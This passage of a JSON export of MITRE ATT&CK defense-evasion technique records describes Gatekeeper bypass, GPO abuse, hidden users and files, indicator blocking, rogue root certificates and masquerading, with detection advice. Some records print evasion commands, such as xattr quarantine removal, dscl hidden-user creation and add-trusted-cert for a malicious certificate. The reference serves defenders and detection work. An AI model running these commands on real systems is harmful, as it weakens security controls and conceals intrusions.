or tainting\/hijacking other instrumental binary\/configuration files via <a href=\"https:\/\/attack.mitre.org\/techniques\/T1574\">Hijack Execution Flow<\/a>.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor and investigate attempts to modify ACLs and file\/directory ownership. Many of the commands used to modify ACLs and file\/directory ownership are built-in system utilities and may generate a high false positive alert rate, so compare against baseline knowledge for how systems are typically used and correlate modification events with other indications of malicious activity where possible.\n\nConsider enabling file\/directory permission change auditing on folders containing key binary\/configuration files. For example, Windows Security Log events (Event ID 4670) are created when DACLs are modified.(Citation: EventTracker File Permissions Feb 2014)","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":252,"platform_id":1,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":252,"platform_id":2,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":252,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":255,"name":"T1144 - Gatekeeper Bypass","sort_id":0,"external_id":"T1144","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>In macOS and OS X, when applications or programs are downloaded from the internet, there is a special attribute set on the file called <code>com.apple.quarantine<\/code>. This attribute is read by Apple's Gatekeeper defense program at execution time and provides a prompt to the user to allow or deny execution. <\/p>\n<p>Apps loaded onto the system from USB flash drive, optical disk, external hard drive, or even from a drive shared over the local network won\u2019t set this flag. Additionally, other utilities or events like drive-by downloads don\u2019t necessarily set it either. This completely bypasses the built-in Gatekeeper check. (Citation: Methods of Mac Malware Persistence) The presence of the quarantine flag can be checked by the xattr command <code>xattr \/path\/to\/MyApp.app<\/code> for <code>com.apple.quarantine<\/code>. Similarly, given sudo access or elevated permission, this attribute can be removed with xattr as well, <code>sudo xattr -r -d com.apple.quarantine \/path\/to\/MyApp.app<\/code>. (Citation: Clearing quarantine attribute) (Citation: OceanLotus for OS X)<\/p>\n<p>In typical operation, a file will be downloaded from the internet and given a quarantine flag before being saved to disk. When the user tries to open the file or application, macOS\u2019s gatekeeper will step in and check for the presence of this flag. If it exists, then macOS will then prompt the user to confirmation that they want to run the program and will even provide the URL where the application came from. However, this is all based on the file being downloaded from a quarantine-savvy application. (Citation: Bypassing Gatekeeper)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":255,"platform_id":2,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":257,"name":"T1484 - Group Policy Modification","sort_id":0,"external_id":"T1484","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Adversaries may modify Group Policy Objects (GPOs) to subvert the intended discretionary access controls for a domain, usually with the intention of escalating privileges on the domain. Group policy allows for centralized management of user and computer settings in Active Directory (AD). GPOs are containers for group policy settings made up of files stored within a predicable network path <code>\\&lt;DOMAIN&gt;\\SYSVOL\\&lt;DOMAIN&gt;\\Policies\\<\/code>.(Citation: TechNet Group Policy Basics)(Citation: ADSecurity GPO Persistence 2016) <\/p>\n<p>Like other objects in AD, GPOs have access controls associated with them. By default all user accounts in the domain have permission to read GPOs. It is possible to delegate GPO access control permissions, e.g. write access, to specific users or groups in the domain.<\/p>\n<p>Malicious GPO modifications can be used to implement many other malicious behaviors such as <a href=\"https:\/\/attack.mitre.org\/techniques\/T1053\">Scheduled Task\/Job<\/a>, <a href=\"https:\/\/attack.mitre.org\/techniques\/T1562\/001\">Disable or Modify Tools<\/a>, <a href=\"https:\/\/attack.mitre.org\/techniques\/T1105\">Ingress Tool Transfer<\/a>, <a href=\"https:\/\/attack.mitre.org\/techniques\/T1136\">Create Account<\/a>, <a href=\"https:\/\/attack.mitre.org\/techniques\/T1035\">Service Execution<\/a>,  and more.(Citation: ADSecurity GPO Persistence 2016)(Citation: Wald0 Guide to GPOs)(Citation: Harmj0y Abusing GPO Permissions)(Citation: Mandiant M Trends 2016)(Citation: Microsoft Hacking Team Breach) Since GPOs can control so many user and machine settings in the AD environment, there are a great number of potential attacks that can stem from this GPO abuse.(Citation: Wald0 Guide to GPOs)<\/p>\n<p>For example, publicly available scripts such as <code>New-GPOImmediateTask<\/code> can be leveraged to automate the creation of a malicious <a href=\"https:\/\/attack.mitre.org\/techniques\/T1053\">Scheduled Task\/Job<\/a> by modifying GPO settings, in this case modifying <code>&lt;GPO_PATH&gt;\\Machine\\Preferences\\ScheduledTasks\\ScheduledTasks.xml<\/code>.(Citation: Wald0 Guide to GPOs)(Citation: Harmj0y Abusing GPO Permissions) In some cases an adversary might modify specific user rights like SeEnableDelegationPrivilege, set in <code>&lt;GPO_PATH&gt;\\MACHINE\\Microsoft\\Windows NT\\SecEdit\\GptTmpl.inf<\/code>, to achieve a subtle AD backdoor with complete control of the domain because the user account under the adversary's control would then be able to modify GPOs.(Citation: Harmj0y SeEnableDelegationPrivilege Right)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"It is possible to detect GPO modifications by monitoring directory service changes using Windows event logs. Several events may be logged for such GPO modifications, including:\n\n* Event ID 5136 - A directory service object was modified\n* Event ID 5137 - A directory service object was created\n* Event ID 5138 - A directory service object was undeleted\n* Event ID 5139 - A directory service object was moved\n* Event ID 5141 - A directory service object was deleted\n\n\nGPO abuse will often be accompanied by some other behavior such as [Scheduled Task\/Job](https:\/\/attack.mitre.org\/techniques\/T1053), which will have events associated with it to detect. Subsequent permission value modifications, like those to SeEnableDelegationPrivilege, can also be searched for in events associated with privileges assigned to new logons (Event ID 4672) and assignment of user rights (Event ID 4704). ","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":257,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":258,"name":"T1148 - HISTCONTROL","sort_id":0,"external_id":"T1148","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>The <code>HISTCONTROL<\/code> environment variable keeps track of what should be saved by the <code>history<\/code> command and eventually into the <code>~\/.bash_history<\/code> file when a user logs out. This setting can be configured to ignore commands that start with a space by simply setting it to &quot;ignorespace&quot;. <code>HISTCONTROL<\/code> can also be set to ignore duplicate commands by setting it to &quot;ignoredups&quot;. In some Linux systems, this is set by default to &quot;ignoreboth&quot; which covers both of the previous examples. This means that \u201c ls\u201d will not be saved, but \u201cls\u201d would be saved by history. <code>HISTCONTROL<\/code> does not exist by default on macOS, but can be set by the user and will be respected. Adversaries can use this to operate without leaving traces by simply prepending a space to all of their terminal commands.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":258,"platform_id":1,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":258,"platform_id":2,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":260,"name":"T1158 - Hidden Files and Directories","sort_id":0,"external_id":"T1158","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>To prevent normal users from accidentally changing special files on a system, most operating systems have the concept of a \u2018hidden\u2019 file. These files don\u2019t show up when a user browses the file system with a GUI or when using normal commands on the command line. Users must explicitly ask to show the hidden files either via a series of Graphical User Interface (GUI) prompts or with command line switches (<code>dir \/a<\/code> for Windows and <code>ls \u2013a<\/code> for Linux and macOS).<\/p>\n<p>Adversaries can use this to their advantage to hide files and folders anywhere on the system for persistence and evading a typical user or system analysis that does not incorporate investigation of hidden files.<\/p>\n<h3>Windows<\/h3>\n<p>Users can mark specific files as hidden by using the attrib.exe binary. Simply do <code>attrib +h filename<\/code> to mark a file or folder as hidden. Similarly, the \u201c+s\u201d marks a file as a system file and the \u201c+r\u201d flag marks the file as read only. Like most windows binaries, the attrib.exe binary provides the ability to apply these changes recursively \u201c\/S\u201d.<\/p>\n<h3>Linux\/Mac<\/h3>\n<p>Users can mark specific files as hidden simply by putting a \u201c.\u201d as the first character in the file or folder name  (Citation: Sofacy Komplex Trojan) (Citation: Antiquated Mac Malware). Files and folder that start with a period, \u2018.\u2019, are by default hidden from being viewed in the Finder application and standard command-line utilities like \u201cls\u201d. Users must specifically change settings to have these files viewable. For command line usages, there is typically a flag to see all files (including hidden ones). To view these files in the Finder Application, the following command must be executed: <code>defaults write com.apple.finder AppleShowAllFiles YES<\/code>, and then relaunch the Finder Application.<\/p>\n<h3>Mac<\/h3>\n<p>Files on macOS can be marked with the UF_HIDDEN flag which prevents them from being seen in Finder.app, but still allows them to be seen in Terminal.app (Citation: WireLurker).\nMany applications create these hidden files and folders to store information so that it doesn\u2019t clutter up the user\u2019s workspace. For example, SSH utilities create a .ssh folder that\u2019s hidden and contains the user\u2019s known hosts and keys.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":260,"platform_id":1,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":260,"platform_id":2,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":260,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":261,"name":"T1147 - Hidden Users","sort_id":0,"external_id":"T1147","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Every user account in macOS has a userID associated with it. When creating a user, you can specify the userID for that account. There is a property value in <code>\/Library\/Preferences\/com.apple.loginwindow<\/code> called <code>Hide500Users<\/code> that prevents users with userIDs 500 and lower from appearing at the login screen. By using the <a href=\"https:\/\/attack.mitre.org\/techniques\/T1136\">Create Account<\/a> technique with a userID under 500 and enabling this property (setting it to Yes), an adversary can hide their user accounts much more easily: <code>sudo dscl . -create \/Users\/username UniqueID 401<\/code> (Citation: Cybereason OSX Pirrit).<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":261,"platform_id":2,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":262,"name":"T1143 - Hidden Window","sort_id":0,"external_id":"T1143","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Adversaries may implement hidden windows to conceal malicious activity from the plain sight of users. In some cases, windows that would typically be displayed when an application carries out an operation can be hidden. This may be utilized by system administrators to avoid disrupting user work environments when carrying out administrative tasks. Adversaries may abuse operating system functionality to hide otherwise visible windows from users so as not to alert the user to adversary activity on the system.<\/p>\n<h3>Windows<\/h3>\n<p>There are a variety of features in scripting languages in Windows, such as <a href=\"https:\/\/attack.mitre.org\/techniques\/T1086\">PowerShell<\/a>, Jscript, and VBScript to make windows hidden. One example of this is <code>powershell.exe -WindowStyle Hidden<\/code>.  (Citation: PowerShell About 2019)<\/p>\n<h3>Mac<\/h3>\n<p>The configurations for how applications run on macOS are listed in property list (plist) files. One of the tags in these files can be\u00a0<code>apple.awt.UIElement<\/code>, which allows for Java applications to prevent the application's icon from appearing in the Dock. A common use for this is when applications run in the system tray, but don't also want to show up in the Dock. However, adversaries can abuse this feature and hide their running window.(Citation: Antiquated Mac Malware)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":262,"platform_id":2,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":262,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":267,"name":"T1054 - Indicator Blocking","sort_id":0,"external_id":"T1054","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>An adversary may attempt to block indicators or events typically captured by sensors from being gathered and analyzed. This could include maliciously redirecting (Citation: Microsoft Lamin Sept 2017) or even disabling host-based sensors, such as Event Tracing for Windows (ETW),(Citation: Microsoft About Event Tracing 2018) by tampering settings that control the collection and flow of event telemetry. (Citation: Medium Event Tracing Tampering 2018) These settings may be stored on the system in configuration files and\/or in the Registry as well as being accessible via administrative utilities such as <a href=\"https:\/\/attack.mitre.org\/techniques\/T1086\">PowerShell<\/a> or <a href=\"https:\/\/attack.mitre.org\/techniques\/T1047\">Windows Management Instrumentation<\/a>.<\/p>\n<p>ETW interruption can be achieved multiple ways, however most directly by defining conditions using the PowerShell Set-EtwTraceProvider cmdlet or by interfacing directly with the registry to make alterations.<\/p>\n<p>In the case of network-based reporting of indicators, an adversary may block traffic associated with reporting to prevent central analysis. This may be accomplished by many means, such as stopping a local process responsible for forwarding telemetry and\/or creating a host-based firewall rule to block traffic to specific hosts responsible for aggregating events, such as security information and event management (SIEM) products. <\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":267,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":268,"name":"T1066 - Indicator Removal from Tools","sort_id":0,"external_id":"T1066","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>If a malicious tool is detected and quarantined or otherwise curtailed, an adversary may be able to determine why the malicious tool was detected (the indicator), modify the tool by removing the indicator, and use the updated version that is no longer detected by the target's defensive systems or subsequent targets that may use similar systems.<\/p>\n<p>A good example of this is when malware is detected with a file signature and quarantined by anti-virus software. An adversary who can determine that the malware was quarantined because of its file signature may use <a href=\"https:\/\/attack.mitre.org\/techniques\/T1045\">Software Packing<\/a> or otherwise modify the file so it has a different signature, and then re-use the malware.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":268,"platform_id":1,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":268,"platform_id":2,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":268,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":269,"name":"T1070 - Indicator Removal on Host","sort_id":0,"external_id":"T1070","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Adversaries may delete or alter generated artifacts on a host system, including logs or captured files such as quarantined malware. Locations and format of logs are platform or product-specific, however standard operating system logs are captured as Windows events or Linux\/macOS files such as <a href=\"https:\/\/attack.mitre.org\/techniques\/T1139\">Bash History<\/a> and \/var\/log\/*.<\/p>\n<p>These actions may interfere with event collection, reporting, or other notifications used to detect intrusion activity. This that may compromise the integrity of security solutions by causing notable events to go unreported. This activity may also impede forensic analysis and incident response, due to lack of sufficient data to determine what occurred.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"File system monitoring may be used to detect improper deletion or modification of indicator files.  Events not stored on the file system may require different detection mechanisms.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":269,"platform_id":1,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":269,"platform_id":2,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":269,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":270,"name":"T1202 - Indirect Command Execution","sort_id":0,"external_id":"T1202","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Adversaries may abuse utilities that allow for command execution to bypass security restrictions that limit the use of command-line interpreters. Various Windows utilities may be used to execute commands, possibly without invoking <a href=\"https:\/\/attack.mitre.org\/software\/S0106\">cmd<\/a>. For example, <a href=\"https:\/\/attack.mitre.org\/software\/S0193\">Forfiles<\/a>, the Program Compatibility Assistant (pcalua.exe), components of the Windows Subsystem for Linux (WSL), as well as other utilities may invoke the execution of programs and commands from a <a href=\"https:\/\/attack.mitre.org\/techniques\/T1059\">Command and Scripting Interpreter<\/a>, Run window, or via scripts. (Citation: VectorSec ForFiles Aug 2017) (Citation: Evi1cg Forfiles Nov 2017)<\/p>\n<p>Adversaries may abuse these features for <a href=\"https:\/\/attack.mitre.org\/tactics\/TA0005\">Defense Evasion<\/a>, specifically to perform arbitrary execution while subverting detections and\/or mitigation controls (such as Group Policy) that limit\/prevent the usage of <a href=\"https:\/\/attack.mitre.org\/software\/S0106\">cmd<\/a> or file extensions more commonly associated with malicious payloads.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor and analyze logs from host-based detection mechanisms, such as Sysmon, for events such as process creations that include or are resulting from parameters associated with invoking programs\/commands\/files and\/or spawning child processes\/network connections. (Citation: RSA Forfiles Aug 2017)","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":270,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":274,"name":"T1130 - Install Root Certificate","sort_id":0,"external_id":"T1130","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Root certificates are used in public key cryptography to identify a root certificate authority (CA). When a root certificate is installed, the system or application will trust certificates in the root's chain of trust that have been signed by the root certificate. (Citation: Wikipedia Root Certificate) Certificates are commonly used for establishing secure TLS\/SSL communications within a web browser. When a user attempts to browse a website that presents a certificate that is not trusted an error message will be displayed to warn the user of the security risk. Depending on the security settings, the browser may not allow the user to establish a connection to the website.<\/p>\n<p>Installation of a root certificate on a compromised system would give an adversary a way to degrade the security of that system. Adversaries have used this technique to avoid security warnings prompting users when compromised systems connect over HTTPS to adversary controlled web servers that spoof legitimate websites in order to collect login credentials. (Citation: Operation Emmental)<\/p>\n<p>Atypical root certificates have also been pre-installed on systems by the manufacturer or in the software supply chain and were used in conjunction with malware\/adware to provide a man-in-the-middle capability for intercepting information transmitted over secure TLS\/SSL communications. (Citation: Kaspersky Superfish)<\/p>\n<p>Root certificates (and their associated chains) can also be cloned and reinstalled. Cloned certificate chains will carry many of the same metadata characteristics of the source and can be used to sign malicious code that may then bypass signature validation tools (ex: Sysinternals, antivirus, etc.) used to block execution and\/or uncover artifacts of Persistence. (Citation: SpectorOps Code Signing Dec 2017)<\/p>\n<p>In macOS, the Ay MaMi malware uses <code>\/usr\/bin\/security add-trusted-cert -d -r trustRoot -k \/Library\/Keychains\/System.keychain \/path\/to\/malicious\/cert<\/code> to install a malicious certificate as a trusted root certificate into the system keychain. (Citation: objective-see ay mami 2018)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":274,"platform_id":1,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":274,"platform_id":2,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":274,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":275,"name":"T1118 - InstallUtil","sort_id":0,"external_id":"T1118","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>InstallUtil is a command-line utility that allows for installation and uninstallation of resources by executing specific installer components specified in .NET binaries. (Citation: MSDN InstallUtil) InstallUtil is located in the .NET directories on a Windows system: <code>C:\\Windows\\Microsoft.NET\\Framework\\v<version>\\InstallUtil.exe<\/code> and <code>C:\\Windows\\Microsoft.NET\\Framework64\\v<version>\\InstallUtil.exe<\/code>. InstallUtil.exe is digitally signed by Microsoft.<\/p>\n<p>Adversaries may use InstallUtil to proxy execution of code through a trusted Windows utility. InstallUtil may also be used to bypass process whitelisting through use of attributes within the binary that execute the class decorated with the attribute <code>[System.ComponentModel.RunInstaller(true)]<\/code>. (Citation: LOLBAS Installutil)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":275,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":281,"name":"T1149 - LC_MAIN Hijacking","sort_id":0,"external_id":"T1149","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>As of OS X 10.8, mach-O binaries introduced a new header called LC_MAIN that points to the binary\u2019s entry point for execution. Previously, there were two headers to achieve this same effect: LC_THREAD and LC_UNIXTHREAD  (Citation: Prolific OSX Malware History). The entry point for a binary can be hijacked so that initial execution flows to a malicious addition (either another section or a code cave) and then goes back to the initial entry point so that the victim doesn\u2019t know anything was different  (Citation: Methods of Mac Malware Persistence). By modifying a binary in this way, application whitelisting can be bypassed because the file name or application path is still the same.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":281,"platform_id":2,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":286,"name":"T1152 - Launchctl","sort_id":0,"external_id":"T1152","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Launchctl controls the macOS launchd process which handles things like launch agents and launch daemons, but can execute other commands or programs itself. Launchctl supports taking subcommands on the command-line, interactively, or even redirected from standard input. By loading or reloading launch agents or launch daemons, adversaries can install persistence or execute changes they made  (Citation: Sofacy Komplex Trojan). Running a command from launchctl is as simple as <code>launchctl submit -l <labelName> -- \/Path\/to\/thing\/to\/execute &quot;arg&quot; &quot;arg&quot; &quot;arg&quot;<\/code>. Loading, unloading, or reloading launch agents or launch daemons can require elevated privileges. <\/p>\n<p>Adversaries can abuse this functionality to execute code or even bypass whitelisting if launchctl is an allowed process.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":286,"platform_id":2,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":291,"name":"T1036 - Masquerading","sort_id":0,"external_id":"T1036","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and\/or security tools. Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. This may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names.<\/p>\n<p>Renaming abusable system utilities to evade security monitoring is also a form of <a href=\"https:\/\/attack.mitre.org\/techniques\/T1036\">Masquerading<\/a>.(Citation: LOLBAS Main Site)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Collect file hashes; file names that do not match their expected hash are suspect. Perform file monitoring; files with known names but in unusual locations are suspect. Likewise, files that are modified outside of an update or patch are suspect.\n\nIf file names are mismatched between the file name on disk and that of the binary's PE metadata, this is a likely indicator that a binary was renamed after it was compiled. Collecting and comparing disk and resource filenames for binaries by looking to see if the InternalName, OriginalFilename, and\/or ProductName match what is expected could provide useful leads, but may not always be indicative of malicious activity. (Citation: Endgame Masquerade Ball) Do not focus on the possible names a file could have, but instead on the command-line arguments that are known to be used and are distinct because it will have a better rate of detection.(Citation: Twitter ItsReallyNick Masquerading Update)\n\nLook for indications of common characters that may indicate an attempt to trick users into misidentifying the file type, such as a space as the last character of a file name or the right-to-left override characters\"\\u202E\", \"[U+202E]\", and \"%E2%80%AE\u201d.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":291,"platform_id":1,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":291,"platform_id":2,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":291,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":293,"name":"T1112 - Modify Registry","sort_id":0,"external_id":"T1112","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove information as part of cleaning up, or as part of other techniques to aid in persistence and execution.<\/p>\n<p>Access to specific areas of the Registry depends on account permissions, some requiring administrator-level access. The built-in Windows command-line utility <a 